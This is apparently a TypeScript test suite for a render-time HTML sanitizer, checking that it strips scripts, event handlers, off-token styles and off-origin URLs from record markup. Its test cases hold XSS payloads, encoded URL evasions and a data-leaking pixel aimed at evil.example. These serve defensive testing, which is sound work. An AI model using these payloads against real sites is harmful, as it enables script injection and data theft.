import { describe, expect, test } from "bun:test";

import { FILE_URL_PREFIX } from "../../platform/files/file-url.ts";
import { mintFileKey } from "../../platform/files/ledger.ts";
import { enforceItemMarkup, neutralizeItemMarkup } from "./enforcer.ts";

// The runtime allow-list enforcer is the last line at render time. These tests cover the accept
// path and each hostile category design-system.md "Forbidden absolutely" enumerates.

/** Assert that enforced markup carries no executable surface whatsoever. */
function expectInert(output: string): void {
  expect(output).not.toMatch(/<script/i);
  expect(output).not.toMatch(/<iframe/i);
  expect(output).not.toMatch(/<svg/i);
  expect(output).not.toMatch(/<style/i);
  expect(output).not.toMatch(/\son[a-z]+\s*=/i); // no on*= event handlers survive
  expect(output).not.toMatch(/javascript:/i);
  expect(output).not.toMatch(/\burl\(/i);
}

describe("enforcer — accept path", () => {
  test("allow-listed classes and elements pass through unchanged", () => {
    const markup =
      '<div class="stack gap-2">' +
      '<span class="text-bold truncate">Title</span>' +
      '<p class="line-clamp-2 text-muted">Body &amp; more</p>' +
      "</div>";
    expect(enforceItemMarkup(markup)).toBe(markup);
  });

  test("token-disciplined inline style passes through unchanged", () => {
    const markup = '<div style="color: var(--leaf); padding: var(--space-2)">x</div>';
    expect(enforceItemMarkup(markup)).toBe(markup);
  });

  test("a media frame with an image field passes through unchanged", () => {
    // Same-origin, because a record never reaches off this origin — see the off-origin
    // cases below.
    const markup =
      '<figure class="media-frame media-frame--wide">' +
      '<img src="/media/p.jpg" alt="a photo" loading="lazy">' +
      "</figure>";
    expect(enforceItemMarkup(markup)).toBe(markup);
  });

  test("free (non-owned-axis) style properties for arrangement are kept", () => {
    const markup =
      '<div style="display: grid; grid-template-columns: 1fr 1fr; aspect-ratio: 16 / 9">x</div>';
    expect(enforceItemMarkup(markup)).toBe(markup);
  });

  test("safe aria and title attributes are preserved", () => {
    const markup = '<span aria-label="star" title="rating">★</span>';
    expect(enforceItemMarkup(markup)).toBe(markup);
  });

  // A record is a `<button>`, so the item's semantics are the platform's. A `role` inside one
  // can only make it lie, and `aria-hidden` takes its text from a reader who cannot see it.
  test("a record may not redeclare what it is, or hide itself from a screen reader", () => {
    for (const attribute of ['role="button"', 'role="link"', 'role="img"', 'aria-hidden="true"']) {
      const output = enforceItemMarkup(`<span ${attribute}>text</span>`);

      expect(output, attribute).toBe("<span>text</span>");
    }
    // Every other `aria-*` still describes the content, which is what they are for.
    expect(enforceItemMarkup('<span aria-label="star">★</span>')).toBe(
      '<span aria-label="star">★</span>',
    );
  });

  test("inline data:image URLs on a media field are preserved", () => {
    const markup = '<img src="data:image/png;base64,iVBORw0KGgo=" alt="dot">';
    expect(enforceItemMarkup(markup)).toBe(markup);
  });
});

describe("enforcer — fabricated / unknown classes", () => {
  test("keeps allow-listed tokens and drops fabricated ones", () => {
    expect(enforceItemMarkup('<div class="stack evil made-up gap-1">x</div>')).toBe(
      '<div class="stack gap-1">x</div>',
    );
  });

  test("removes the class attribute entirely when nothing is allow-listed", () => {
    expect(enforceItemMarkup('<div class="totally fake">x</div>')).toBe("<div>x</div>");
  });
});

describe("enforcer — off-token style on the owned axes", () => {
  test("drops a raw color", () => {
    expect(enforceItemMarkup('<div style="color:red">x</div>')).toBe("<div>x</div>");
  });

  test("drops a hex color but keeps the conforming sibling declaration", () => {
    expect(enforceItemMarkup('<div style="background:#fff;color:var(--ink)">x</div>')).toBe(
      '<div style="color:var(--ink)">x</div>',
    );
  });

  test("drops a raw font size but keeps a token one", () => {
    expect(enforceItemMarkup('<div style="font-size:24px">x</div>')).toBe("<div>x</div>");
    expect(enforceItemMarkup('<div style="font-size: var(--type-lg)">x</div>')).toBe(
      '<div style="font-size: var(--type-lg)">x</div>',
    );
  });

  test("drops raw spacing but keeps token spacing and structural 0 / auto", () => {
    expect(enforceItemMarkup('<div style="padding:16px">x</div>')).toBe("<div>x</div>");
    expect(enforceItemMarkup('<div style="margin:0 auto">x</div>')).toBe(
      '<div style="margin:0 auto">x</div>',
    );
    expect(enforceItemMarkup('<div style="gap: var(--space-1)">x</div>')).toBe(
      '<div style="gap: var(--space-1)">x</div>',
    );
  });

  // A boundary the browser draws with no declaration at all: the one edge a property-keyed ban
  // cannot see. It has no content, so unwrapping it leaves nothing behind.
  test("an <hr> is a boundary, and the ink system owns every boundary", () => {
    expect(
      enforceItemMarkup('<div class="stack gap-1"><span>A</span><hr><span>B</span></div>'),
    ).toBe('<div class="stack gap-1"><span>A</span><span>B</span></div>');
    expect(enforceItemMarkup("<hr>")).toBe("");
  });

  test("drops a boundary at any weight, and keeps the fill that replaces it", () => {
    expect(enforceItemMarkup('<div style="border:2px solid red">x</div>')).toBe("<div>x</div>");
    expect(enforceItemMarkup('<div style="border:var(--line) solid var(--ink)">x</div>')).toBe(
      "<div>x</div>",
    );
    const ok = '<div style="background-color:var(--sun)">x</div>';
    expect(enforceItemMarkup(ok)).toBe(ok);
  });

  test("drops any font-family declaration (family is never declared)", () => {
    expect(enforceItemMarkup('<div style="font-family:Comic Sans">x</div>')).toBe("<div>x</div>");
    expect(enforceItemMarkup('<div style="font:italic 12px serif">x</div>')).toBe("<div>x</div>");
  });

  test("drops every border-radius form (High Meadow has no radius tokens)", () => {
    expect(enforceItemMarkup('<div style="border-radius:8px">x</div>')).toBe("<div>x</div>");
    expect(enforceItemMarkup('<div style="border-radius:0">x</div>')).toBe("<div>x</div>");
    expect(enforceItemMarkup('<div style="border-top-left-radius:8px">x</div>')).toBe(
      "<div>x</div>",
    );
    expect(enforceItemMarkup('<div style="border-start-end-radius:8px">x</div>')).toBe(
      "<div>x</div>",
    );
    expect(enforceItemMarkup('<div style="-webkit-border-radius:8px">x</div>')).toBe(
      "<div>x</div>",
    );
  });

  test("drops box-shadow, including the silently-invalid token form", () => {
    // `var(--shadow-window)` is `5 6 0.24` — a bare `<x> <y> <alpha>` triple, not a CSS
    // shadow. It paints nothing and reports nothing, so the ban is what catches it.
    expect(enforceItemMarkup('<div style="box-shadow:var(--shadow-window)">x</div>')).toBe(
      "<div>x</div>",
    );
    expect(enforceItemMarkup('<div style="box-shadow:0 2px 4px var(--ink)">x</div>')).toBe(
      "<div>x</div>",
    );
    expect(enforceItemMarkup('<div style="-webkit-box-shadow:0 0 2px var(--ink)">x</div>')).toBe(
      "<div>x</div>",
    );
  });

  test("drops a colour token that is not in the High Meadow palette", () => {
    // The chrome-only colours are not the palette a record picks from, and the retired
    // Paper & Ink `--color-*` vocabulary resolves to nothing at all.
    expect(enforceItemMarkup('<div style="color:var(--color-text)">x</div>')).toBe("<div>x</div>");
    expect(enforceItemMarkup('<div style="background-color:var(--pane-1)">x</div>')).toBe(
      "<div>x</div>",
    );
    expect(enforceItemMarkup('<div style="color:var(--focus-ring)">x</div>')).toBe("<div>x</div>");
  });

  test("drops an inline custom-property definition (no laundering off-token values)", () => {
    expect(enforceItemMarkup('<div style="--x:red;color:var(--x)">x</div>')).toBe("<div>x</div>");
  });
});

describe("enforcer — forbidden style constructs", () => {
  test("drops url() — external and javascript:", () => {
    expect(enforceItemMarkup('<div style="background:url(https://e/x.png)">x</div>')).toBe(
      "<div>x</div>",
    );
    expect(enforceItemMarkup('<div style="background:url(javascript:alert(1))">x</div>')).toBe(
      "<div>x</div>",
    );
  });

  test("drops item-escaping position values, keeps in-flow ones", () => {
    expect(enforceItemMarkup('<div style="position:fixed">x</div>')).toBe("<div>x</div>");
    expect(enforceItemMarkup('<div style="position:absolute">x</div>')).toBe("<div>x</div>");
    expect(enforceItemMarkup('<div style="position:sticky">x</div>')).toBe("<div>x</div>");
    expect(enforceItemMarkup('<div style="position:relative">x</div>')).toBe(
      '<div style="position:relative">x</div>',
    );
  });

  test("drops the legacy expression() script vector", () => {
    expect(enforceItemMarkup('<div style="width:expression(alert(1))">x</div>')).toBe(
      "<div>x</div>",
    );
  });
});

describe("enforcer — scripts and event handlers", () => {
  test("removes a <script> element and its content, keeping surrounding text", () => {
    expect(enforceItemMarkup("<div>keep<script>alert(1)</script>me</div>")).toBe(
      "<div>keepme</div>",
    );
  });

  test("removes a <style> element and its content", () => {
    expect(enforceItemMarkup("<div>keep<style>*{color:red}</style></div>")).toBe("<div>keep</div>");
  });

  test("strips on*= handlers regardless of casing", () => {
    expect(enforceItemMarkup('<div onclick="evil()">x</div>')).toBe("<div>x</div>");
    expect(enforceItemMarkup('<img src="x" ONERROR="evil()">')).toBe('<img src="x">');
  });

  test("removes an uppercase <SCRIPT> tag too (tag matching is case-insensitive)", () => {
    expect(enforceItemMarkup("<div>ok<SCRIPT>evil()</SCRIPT></div>")).toBe("<div>ok</div>");
  });

  test("removes foreign-content (svg) and its nested script", () => {
    expect(enforceItemMarkup("<div><svg><script>evil()</script></svg>text</div>")).toBe(
      "<div>text</div>",
    );
  });

  test("strips a comment that hides markup", () => {
    expect(enforceItemMarkup("<div>a<!-- <script>x</script> -->b</div>")).toBe("<div>ab</div>");
  });
});

// A record may not make the browser fetch from somewhere else. Leaving `<img src>` open made the
// `url(...)` ban half a rule: a remote 1×1 with record fields in its query string passed clean.
describe("enforcer — a record never reaches off this origin", () => {
  test("drops a remote media URL while keeping the element and its other attributes", () => {
    const output = enforceItemMarkup(
      '<img src="https://evil.example/px.gif?d=secret" alt="x" width="1">',
    );

    expect(output).not.toContain("evil.example");
    expect(output).toContain('alt="x"');
    expect(output).toContain('width="1"');
  });

  test("drops every off-origin spelling", () => {
    for (const url of [
      "https://evil.example/p.gif",
      "http://evil.example/p.gif",
      "//evil.example/p.gif",
      "HTTPS://EVIL.EXAMPLE/p.gif",
      "https:/\u200b/evil.example/p.gif",
      "ftp://evil.example/p.gif",
      "blob:https://evil.example/x",
    ]) {
      expect(enforceItemMarkup(`<img src="${url}" alt="x">`), url).not.toContain("evil.example");
    }
  });

  test("sees every candidate in a srcset, not just the first", () => {
    const output = enforceItemMarkup(
      '<img src="/a.png" srcset="/a.png 1x, https://evil.example/b.png 2x" alt="x">',
    );

    expect(output).not.toContain("evil.example");
    expect(output).toContain('src="/a.png"');
  });

  test("keeps the two addresses a record legitimately holds", () => {
    const inline = '<img src="data:image/png;base64,iVBORw0KGgo=" alt="x">';
    const relative = '<img src="/media/p.jpg" alt="x">';
    const bare = '<img src="p.jpg" alt="x">';

    expect(enforceItemMarkup(inline)).toBe(inline);
    expect(enforceItemMarkup(relative)).toBe(relative);
    expect(enforceItemMarkup(bare)).toBe(bare);
  });

  test("reads an address through its character references, as a browser does", () => {
    for (const url of [
      "https&#58;//evil.example/p.gif",
      "https&#x3A;//evil.example/p.gif",
      "&#x2F;&#47;evil.example/p.gif",
      "https&colon;//evil.example/p.gif",
      "java&Tab;script:alert(1)",
      "\\\\evil.example/p.gif",
      "/\\evil.example/p.gif",
      "\\/evil.example/p.gif",
      "&#92;&#92;evil.example/p.gif",
      "&bsol;&sol;evil.example/p.gif",
    ]) {
      const output = enforceItemMarkup(`<img src="${url}" alt="x">`);
      expect(output, url).toBe('<img alt="x">');
    }
    const srcset = enforceItemMarkup(
      '<img srcset="/a.png 1x, https&#x3a;//evil.example/b.png 2x">',
    );
    expect(srcset).toBe("<img>");
  });

  test("keeps an address whose references spell nothing that leaves this origin", () => {
    for (const markup of [
      '<img src="/media/p.jpg?w=1&amp;h=2&#38;q=3&AMP;r=4" alt="x">',
      "<img src=\"data:image/svg+xml;utf8,&lt;svg xmlns='http://www.w3.org/2000/svg'&gt;&lt;text&gt;caf&eacute;&lt;/text&gt;&lt;/svg&gt;\">",
      '<img src="data:image/svg+xml,%3Csvg%3E%3Ctext%3Ea,b:c%3C/text%3E%3C/svg%3E">',
      '<img src="https&constructor;//evil.example/p.gif" alt="x">',
    ]) {
      expect(enforceItemMarkup(markup), markup).toBe(markup);
    }
  });

  test("reads a backslash as the slash a browser reads, in a srcset and a poster too", () => {
    expect(enforceItemMarkup('<img srcset="/a.png 1x, \\\\evil.example/b.png 2x">')).toBe("<img>");
    expect(enforceItemMarkup('<video poster="/\\evil.example/p.gif"></video>')).toBe(
      "<video></video>",
    );
  });
});

describe("enforcer — a served file's image", () => {
  const served = `${FILE_URL_PREFIX}${mintFileKey()}`;

  test("always loads lazily and decodes asynchronously", () => {
    expect(enforceItemMarkup(`<img src="${served}" alt="x">`)).toBe(
      `<img src="${served}" alt="x" loading="lazy" decoding="async">`,
    );
    expect(enforceItemMarkup(`<img src="${served}" LOADING="eager" decoding="sync">`)).toBe(
      `<img src="${served}" LOADING="lazy" decoding="async">`,
    );
  });

  test("is found through a relative path, a backslash, or a picture's source", () => {
    for (const src of [`.${served}`, served.slice(1), served.replaceAll("/", "\\")]) {
      expect(enforceItemMarkup(`<img src="${src}">`), src).toContain('loading="lazy"');
    }
    expect(
      enforceItemMarkup(`<picture><source srcset="${served}"><img src="/media/p.jpg"></picture>`),
    ).toContain('<img src="/media/p.jpg" loading="lazy" decoding="async">');
    expect(
      enforceItemMarkup(
        `<picture><source srcset="/media/p.jpg"><img src="/media/p.jpg"></picture>`,
      ),
    ).not.toContain("loading=");
    expect(enforceItemMarkup(`<img src="data:image/png,${served}">`)).not.toContain("loading=");
    expect(enforceItemMarkup(`<img src="/media/a.png,${served}">`)).not.toContain("loading=");
  });

  test("is found through a srcset or a character reference", () => {
    expect(enforceItemMarkup(`<img srcset="${served} 1x">`)).toBe(
      `<img srcset="${served} 1x" loading="lazy" decoding="async">`,
    );
    const encoded = `&#x2F;${served.slice(1)}`;
    expect(enforceItemMarkup(`<img src="${encoded}">`)).toBe(
      `<img src="${encoded}" loading="lazy" decoding="async">`,
    );
  });

  test("already carrying both passes through unchanged", () => {
    const complete = `<img src="${served}" alt="x" loading="lazy" decoding="async">`;
    expect(enforceItemMarkup(complete)).toBe(complete);
  });

  test("is the only image given them", () => {
    for (const markup of [
      '<img src="/media/p.jpg" alt="x">',
      '<img src="data:image/png;base64,iVBORw0KGgo=" alt="x">',
      `<img src="https://evil.example${served}" alt="x">`,
      `<span title="${served}">x</span>`,
    ]) {
      expect(enforceItemMarkup(markup), markup).not.toContain("loading=");
    }
  });

  test("never throws on a picture that closes itself inside foreign content", () => {
    for (const markup of [
      "<svg><picture/></svg>",
      "<math><PICTURE/></math>",
      "x<svg><picture/></svg>",
    ]) {
      expect(() => enforceItemMarkup(markup), markup).not.toThrow();
    }
  });

  test("counts a source only inside an open picture, the innermost one", () => {
    const afterVideo = `<video><source src="${served}"></video><img src="/y.png">`;
    expect(enforceItemMarkup(afterVideo)).not.toContain("loading=");
    const videoInPicture = `<picture><video><source src="${served}"></video><img src="/y.png"></picture>`;
    expect(enforceItemMarkup(videoInPicture)).not.toContain("loading=");
    const nested = `<picture><source srcset="${served}"><picture></picture><img src="/y.png"></picture>`;
    expect(enforceItemMarkup(nested)).toContain(
      '<img src="/y.png" loading="lazy" decoding="async">',
    );
  });

  test("gains nothing from neutralizing alone, which is what design lint diffs against", () => {
    const bare = `<img src="${served}" alt="x">`;
    expect(neutralizeItemMarkup(bare)).toBe(bare);
  });
});

describe("enforcer — interactive descendants", () => {
  test("unwraps a link, keeping its text and dropping its href", () => {
    expect(enforceItemMarkup('<a href="javascript:evil()">click</a>')).toBe("click");
  });

  test("unwraps a button and removes any script nested inside it", () => {
    expect(enforceItemMarkup("<button onclick=x><script>evil()</script>Label</button>")).toBe(
      "Label",
    );
  });

  test("unwraps a form and its controls, keeping visible text", () => {
    const out = enforceItemMarkup('<form action="/steal"><input name="x"><span>Name</span></form>');
    expect(out).toBe("<span>Name</span>");
  });

  test("removes an embedding iframe with its content", () => {
    expect(enforceItemMarkup('<div><iframe src="//evil"></iframe>ok</div>')).toBe("<div>ok</div>");
  });

  test("unwraps an unknown/custom element, keeping inner record text", () => {
    expect(enforceItemMarkup("<my-widget data-x='1'>hi</my-widget>")).toBe("hi");
  });

  test("drops id and name to prevent DOM clobbering", () => {
    expect(enforceItemMarkup('<div id="body" name="getElementById">x</div>')).toBe("<div>x</div>");
  });
});

describe("enforcer — hostile field-value smuggling comes out inert", () => {
  test("a broken-out field value cannot introduce executable markup", () => {
    const hostile = '<span>Title</span>"><img src=x onerror=alert(1)><script>evil()</script>';
    const out = enforceItemMarkup(hostile);
    expect(out).toContain("Title");
    expectInert(out);
  });

  test("a script spliced between fields is removed", () => {
    const hostile = '<div class="stack"><span>A</span><script>evil()</script><span>B</span></div>';
    const out = enforceItemMarkup(hostile);
    expect(out).toBe('<div class="stack"><span>A</span><span>B</span></div>');
    expectInert(out);
  });

  test("a style-attribute injection is neutralized", () => {
    const hostile = '<div style="color:red;background:url(javascript:alert(1))">data</div>';
    const out = enforceItemMarkup(hostile);
    expect(out).toBe("<div>data</div>");
    expectInert(out);
  });

  test("a dangerous scheme in a media src is dropped, keeping the element", () => {
    expect(enforceItemMarkup('<img src="javascript:alert(1)" alt="x">')).toBe('<img alt="x">');
    expect(enforceItemMarkup('<img srcset="a.jpg 1x, javascript:evil 2x" alt="x">')).toBe(
      '<img alt="x">',
    );
    expect(enforceItemMarkup('<img src="data:text/html,<script>evil</script>" alt="x">')).toBe(
      '<img alt="x">',
    );
  });

  test("a <template> mutation-XSS vector is removed with its content", () => {
    expect(enforceItemMarkup("<div>ok<template><script>evil()</script></template></div>")).toBe(
      "<div>ok</div>",
    );
  });
});

describe("enforcer — deterministic and dependency-free", () => {
  test("carries no parser state between calls", () => {
    const hostile = '<a href="x" onclick="e()"><script>e()</script><b style="color:red">Hi</b></a>';
    const first = enforceItemMarkup(hostile);

    // Interleave different markup: a rewriter that leaked state across calls would return
    // something different the second time, which back-to-back identical calls cannot detect.
    enforceItemMarkup('<section id="other"><img src="x" onerror="e()"></section>');

    expect(enforceItemMarkup(hostile)).toBe(first);
    // The anchor and script are dropped outright; only the allowed inline element
    // survives, stripped of its style attribute.
    expect(first).toBe("<b>Hi</b>");
  });

  test("passes element-free text through untouched", () => {
    expect(enforceItemMarkup("just a plain field value")).toBe("just a plain field value");
    expect(enforceItemMarkup("")).toBe("");
  });
});

describe("enforcer — a repeated attribute collapses to the copy a browser honours", () => {
  test("a hostile duplicate cannot outlive the conforming first copy", () => {
    // Before this, `removeAttribute` on the second copy deleted the first, so the enforcer turned
    // an attribute the browser was ignoring into the live one.
    expect(
      enforceItemMarkup(
        '<div style="color: var(--ink)" style="background-image: url(https://evil.example/x.png)">x</div>',
      ),
    ).toBe('<div style="color: var(--ink)">x</div>');
    expect(
      enforceItemMarkup('<div style="color: var(--ink)" style="position: fixed; top: 0">x</div>'),
    ).toBe('<div style="color: var(--ink)">x</div>');
    expect(enforceItemMarkup('<div class="stack" class="fabricated-danger">x</div>')).toBe(
      '<div class="stack">x</div>',
    );
    expect(enforceItemMarkup('<img src="ok.png" src="javascript:alert(1)">')).toBe(
      '<img src="ok.png">',
    );
  });

  test("a duplicated first copy that is itself off-contract is still cleaned", () => {
    expect(enforceItemMarkup('<div style="color: red" style="color: var(--ink)">x</div>')).toBe(
      "<div>x</div>",
    );
    expect(enforceItemMarkup('<img src="javascript:alert(1)" src="ok.png">')).toBe("<img>");
  });

  test("markup with no repeated attribute is untouched", () => {
    const markup = '<div class="stack" style="color: var(--ink)"><span>x</span></div>';
    expect(enforceItemMarkup(markup)).toBe(markup);
  });
});
